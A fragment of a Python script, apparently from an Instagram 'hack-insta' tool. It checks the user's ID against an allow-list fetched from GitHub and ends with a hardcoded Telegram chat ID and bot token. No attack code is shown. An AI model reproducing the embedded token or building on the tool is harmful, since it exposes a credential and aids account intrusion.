...
def chk(): 
  ...
  print("\n\n\x1b[37;1mYour ID : "+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/ABDULACOD3R/hack-insta/main/ID.txt").text 
    if id in httpCaht: 
      print("\033[92mID ACTIVE OK.........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[91mID ACTIVE NYA  Bo Active KRdn Nama @Team1337_m\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
id_my = '1560964757'
token_my = '1768654774:AAH7EhoB67C8qX8sqDw_wUtXZQmlLZ48U5E'
